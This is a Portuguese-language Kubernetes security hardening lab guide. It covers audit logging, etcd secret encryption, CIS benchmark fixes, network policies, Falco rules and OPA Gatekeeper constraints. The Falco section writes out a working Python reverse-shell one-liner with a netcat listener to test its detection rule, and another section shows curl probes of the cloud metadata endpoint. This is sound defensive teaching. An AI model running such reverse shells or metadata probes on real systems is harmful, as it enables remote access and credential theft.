Mutirao DevOps
---
Install
---

***Instalando Docker***
```
curl -fsSL https://get.docker.com | bash
```
Verificando o cgroupdriver:
```
docker info
```
Alterando o cgroupdriver para systemD
```
echo '{"exec-opts": ["native.cgroupdriver=systemd"]}' > /etc/docker/daemon.json
systemctl restart docker
docker info | grep "Cgroup Driver"
```
---

***Instalando K8S***


Carregando modulos
```
cat <<EOF | sudo tee /etc/modules-load.d/k8s.conf
br_netfilter
EOF

cat <<EOF | sudo tee /etc/sysctl.d/k8s.conf
net.bridge.bridge-nf-call-ip6tables = 1
net.bridge.bridge-nf-call-iptables = 1
EOF
sysctl --system
```

Adicionando repo + install:
```
apt-get update && apt-get install -y apt-transport-https ca-certificates curl

curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg

echo "deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee /etc/apt/sources.list.d/kubernetes.list


apt-get update
apt-get install -y kubelet kubeadm kubectl
apt-mark hold kubelet kubeadm kubectl
```
Configurando autocompletion
```
source <(kubectl completion bash)
echo "source <(kubectl completion bash)" >> ~/.bashrc 
```

***KubeADM config file:***
Kubelet TLS:

```
cat <<EOF | tee kubeadm.yaml
apiVersion: kubeadm.k8s.io/v1beta3
kind: ClusterConfiguration
---
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
serverTLSBootstrap: true
EOF

```

Init do cluster
```
kubeadm init --config=kubeadm.yaml 
kubectl get no
kubectl get csr
kubectl certificate approve
```

Apply da CNI
```
kubectl apply -f "https://cloud.weave.works/k8s/net?k8s-version=$(kubectl version | base64 | tr -d '\n')"
```



***Instalando Kube-bench***
```
docker run --rm -v `pwd`:/host aquasec/kube-bench:latest install
```
***Instalando Trivy***
```
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin v0.21.0
```
Audit LOG
---

***Ativando AuditLog***

```
RequestReceived - The stage for events generated as soon as the audit handler receives the request, and before it is delegated down the handler chain.
ResponseStarted - Once the response headers are sent, but before the response body is sent. This stage is only generated for long-running requests (e.g. watch).
ResponseComplete - The response body has been completed and no more bytes will be sent.
Panic - Events generated when a panic occurred.


None - don't log events that match this rule.
Metadata - log request metadata (requesting user, timestamp, resource, verb, etc.) but not request or response body.
Request - log event metadata and request body but not response body. This does not apply for non-resource requests.
RequestResponse - log event metadata, request and response bodies. This does not apply for non-resource requests.



--audit-log-path specifies the log file path that log backend uses to write audit events. Not specifying this flag disables log backend. - means standard out
--audit-log-maxage defined the maximum number of days to retain old audit log files
--audit-log-maxbackup defines the maximum number of audit log files to retain
--audit-log-maxsize defines the maximum size in megabytes of the audit log file before it gets rotated
```

***Editando o api server:***
vim /etc/kubernetes/manifests/kube-apiserver.yaml
```
- --audit-log-maxage=30    
- --audit-log-maxbackup=10 
- --audit-log-maxsize=100 
- --audit-policy-file=/etc/kubernetes/audit-policy.yaml
- --audit-log-path=/var/log/audit.log



volumeMounts:
  - mountPath: /etc/kubernetes/audit-policy.yaml
    name: audit
    readOnly: true
  - mountPath: /var/log/audit.log
    name: audit-log
    readOnly: false


- name: audit
  hostPath:
    path: /etc/kubernetes/audit-policy.yaml
    type: File

- name: audit-log
  hostPath:
    path: /var/log/audit.log
    type: FileOrCreate
```

***Policy***
```
cat <<EOF | tee /etc/kubernetes/audit-policy.yaml 
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages:
  - "RequestReceived"

rules:
# log no "read" actions
- level: None
  verbs: ["get", "watch", "list"]

# log nothing regarding events
- level: None
  resources:
  - group: "" # core
    resources: ["events"]

# log nothing coming from some groups
- level: None
  userGroups: ["system:nodes"]

- level: RequestResponse
  resources:
  - group: ""
    resources: ["secrets"]

# for everything else log
- level: Metadata
EOF
```


Encrypting Secret Data at Rest
---

https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/

Criando secret para teste:
```
kubectl create secret generic semcrytoteste --from-literal=senha=teste1 -n kube-system
```
Verificando valor no ETCD:
```
docker exec -it 83c1098072da etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt get /registry/secrets/kube-system/semcrytoteste
```

```
cat <<EOF | tee /etc/kubernetes/encrypt.yaml 
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - aescbc:
        keys:
        - name: key1
          secret: <BASE 64 ENCODED SECRET>
    - identity: {}
EOF    
```
Gerando chave de 32 bytes:
```
head -c 32 /dev/urandom | base64
```
Editando o api server:
vim /etc/kubernetes/manifests/kube-apiserver.yaml
```
--encryption-provider-config=/etc/kubernetes/encrypt.yaml 
```


Criando nova secret e testando:
```

kubectl create secret generic crytoteste --from-literal=senha=teste1 -n kube-system


docker exec -it 83c1098072da etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt get /registry/secrets/kube-system/crytoteste 

docker exec -it 83c1098072da etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt get /registry/secrets/kube-system/crytoteste | hexdump -C
```


Criptografando tudo:
```

kubectl get secrets --all-namespaces -o json | kubectl replace -f -
```



***AJUSTANDO TUDO***


[FAIL] 1.1.12 Ensure that the etcd data directory ownership is set to etcd:etcd (Automated)

```
groupadd --system etcd
useradd -s /sbin/nologin --system -g etcd etcd
chown etcd:etcd /var/lib/etcd
```


[WARN] 1.2.11 Ensure that the admission control plugin AlwaysPullImages is set (Manual)
[WARN] 1.2.12 Ensure that the admission control plugin SecurityContextDeny is set if PodSecurityPolicy is not used (Manual)
[PASS] 1.2.13 Ensure that the admission control plugin ServiceAccount is set (Automated)
[PASS] 1.2.14 Ensure that the admission control plugin NamespaceLifecycle is set (Automated)
[FAIL] 1.2.15 Ensure that the admission control plugin PodSecurityPolicy is set (Automated)
[PASS] 1.2.16 Ensure that the admission control plugin NodeRestriction is set (Automated)
```

- --enable-admission-plugins=NodeRestriction,AlwaysPullImages
```



[FAIL] 1.2.18 Ensure that the --insecure-port argument is set to 0 (Automated)
```
- --insecure-port=0
```


[FAIL] 1.3.2 Ensure that the --profiling argument is set to false (Automated)

```
- --profiling=false
```

Kubelet 

[FAIL] 4.2.6 Ensure that the --protect-kernel-defaults argument is set to true (Automated)

```
cat /etc/systemd/system/kubelet.service.d/10-kubeadm.conf
vim /var/lib/kubelet/config.yaml

protectKernelDefaults: true



systemctl daemon-reload
systemctl restart kubelet.service
```


Primeiro pod
---

***Criando SA***
```
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
automountServiceAccountToken: false
```

***Imutable***
```
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: nginx
  name: nginx
spec:
  containers:
  - image: p0ssuidao/vulne-pod-lab:01
    name: nginx
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always



kubectl expose pod nginx --port=8080 --target-port=8080 --type=NodePort --name=nginx-service
```

***Adcionando imutabildiade:***
```
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx
  name: nginx
spec:
  containers:
  - image: p0ssuidao/vulne-pod-lab:01
    name: nginx
    resources: {}
    securityContext:
      readOnlyRootFilesystem: true
  dnsPolicy: ClusterFirst
  restartPolicy: Always
```


***Adicionando tmpfs:***
```
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx
  name: nginx
spec:
  containers:
  - image: p0ssuidao/vulne-pod-lab:01
    name: nginx
    resources: {}
    securityContext:
      readOnlyRootFilesystem: true
    volumeMounts:
      - mountPath: /webshell-server/sessions
        name: sessions
  volumes:
  - name: sessions
    emptyDir: {}  
  dnsPolicy: ClusterFirst
  restartPolicy: Always
```


***Removendo binarios:***
```
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx
  name: nginx
spec:
  containers:
  - image: nginx
    name: nginx
    resources: {}
    startupProbe:
      exec:
        command:
        - rm
        - /bin/bash
      initialDelaySeconds: 1
      periodSeconds: 5
  dnsPolicy: ClusterFirst
  restartPolicy: Always
```



Network Policy
---

***Acessando Cloud Metadata:***
```
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/public-ipv4
```



***Criando um deny all:***
```
cat <<EOF | tee netpol.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - ports:
    - port: 53
      protocol: TCP
    - port: 53
      protocol: UDP
EOF
```

***Liberando entranda por outro pod:***

```
cat <<EOF | tee netpol.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny
  namespace: default
spec:
  podSelector: 
    matchLabels:
      run: nginx
  policyTypes:
  - Egress
  - Ingress
  ingress:
  - from: 
    - podSelector:
        matchLabels:
          run: liberado    
  - ports:
    - port: 8080
      protocol: TCP  
  egress:
  - ports:
    - port: 53
      protocol: TCP
    - port: 53
      protocol: UDP
EOF
```






Falco
---
https://sysdig.com/blog/reverse-shell-falco-sysdig-secure/

***Install:***
```
curl -s https://falco.org/repo/falcosecurity-3672BA8F.asc | apt-key add -
echo "deb https://download.falco.org/packages/deb stable main" | tee -a /etc/apt/sources.list.d/falcosecurity.list
apt-get update -y

apt-get -y install linux-headers-$(uname -r)


apt-get install -y falco

```




***Sobre***
```

Let’s create a Falco rule using what we’ve seen so far to detect these reverse shells.

Usually, when a program starts a network connection, the system will open a socket for the network connection. A socket is nothing but a file descriptor with a number assigned by the system. Each open file descriptor in the system has a number assigned and never conflicts with each other. By default, STDIN is assigned with 0, STDOUT with 1 and STDERR with 2.

We’ve seen in the examples above that a reverse shell redirects STDIN and STDOUT to an open socket with a network connection. In the Unix system, this redirection is done via the dup system call.

In the condition section, you can see this Falco rule is detecting any dup system call that duplicates file descriptors in any STDIN, STDOUT and STDERR with a network type file descriptor.
```


***Primeira rule:***
```
- rule: Reverse shell
  desc: Detect reverse shell established remote connection
  condition: evt.type=dup and container and fd.num in (0, 1, 2) and fd.type in ("ipv4", "ipv6")
  output: >
    Reverse shell connection (user=%user.name %container.info process=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository fd.name=%fd.name fd.num=%fd.num fd.type=%fd.type fd.sip=%fd.sip)
  priority: WARNING
  tags: [container, shell, mitre_execution]
  append: false
```


***Testando role:***
```
Node: Nginx

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.142.0.42",32000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'



Control Plane

nc  -l 32000
```

***Segunda role:***
```
- rule: Launch Privileged Container
  desc: Detect the initial process started in a privileged container. Exceptions are made for known trusted images.
  condition: >
    container_started and container
    and container.privileged=true
    and not falco_privileged_containers
    and not user_privileged_containers
  output: Privileged container started (user=%user.name user_loginuid=%user.loginuid command=%proc.cmdline %container.info image=%container.image.repository:%container.image.tag)
  priority: WARNING
  tags: [container, cis, mitre_privilege_escalation, mitre_lateral_movement]
```






OPA
---

***Deploy:***
```
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.5/deploy/gatekeeper.yaml
```

***Exclud NS***
```
cat > /excludns.yaml <<EOF
apiVersion: config.gatekeeper.sh/v1alpha1
kind: Config
metadata:
  name: config
  namespace: "gatekeeper-system"
spec:
  match:
    - excludedNamespaces: ["kube-system", "gatekeeper-system"]
      processes: ["*"]
EOF
```


***Criando o primeiro template:***
```
cat > /tmp/constrainttemplate.yaml <<EOF
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: privilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: PrivilegedContainer
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package privileged

        violation[{"msg": msg, "details": {}}] {
            c := input_containers[_]
            c.securityContext.privileged
            msg := sprintf("Nao e permitido o uso de containers privilegiados: %v, securityContext: %v", [c.name, c.securityContext])
        }

        input_containers[c] {
            c := input.review.object.spec.containers[_]
        }

        input_containers[c] {
            c := input.review.object.spec.initContainers[_]
        }
EOF
```
***Criando constraint: ***
```
cat > /tmp/constraint.yaml <<EOF
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: PrivilegedContainer
metadata:
  name: privileged-container
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
EOF
```
***Verificando***
```
kubectl get constraint
kubectl get constrainttemplate
```

***Criando pod de teste:***
```
cat > /tmp/example.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: priv-nginx
  labels:
    app: priv-nginx
spec:
  containers:
  - name: nginx
    image: nginx
    securityContext:
      privileged: true
EOF

kubectl create -f /tmp/example.yaml
```


***Policy FileSystem:***

```
cat > /tmp/constrainttemplate_filesystem.yaml <<EOF
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: readonlyrootfilesystem
spec:
  crd:
    spec:
      names:
        kind: ReadOnlyRootFilesystem
      validation:
        openAPIV3Schema:
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package readonlyrootfilesystem
        violation[{"msg": msg, "details": {}}] {
            c := input_containers[_]
            input_read_only_root_fs(c)
            msg := sprintf("only read-only root filesystem container is allowed: %v", [c.name])
        }
        input_read_only_root_fs(c) {
            not has_field(c, "securityContext")
        }
        input_read_only_root_fs(c) {
            not c.securityContext.readOnlyRootFilesystem == true
        }
        input_containers[c] {
            c := input.review.object.spec.containers[_]
        }
        input_containers[c] {
            c := input.review.object.spec.initContainers[_]
        }
        has_field(object, field) = true {
            object[field]
        }
EOF
kubectl apply -f /tmp/constrainttemplate_filesystem.yaml
```
***Constraint:***
```
cat > /tmp/constraint_filesystem.yaml <<EOF
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: ReadOnlyRootFilesystem
metadata:
  name: readonlyrootfilesystem
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
EOF
kubectl apply -f /tmp/constraint_filesystem.yaml
```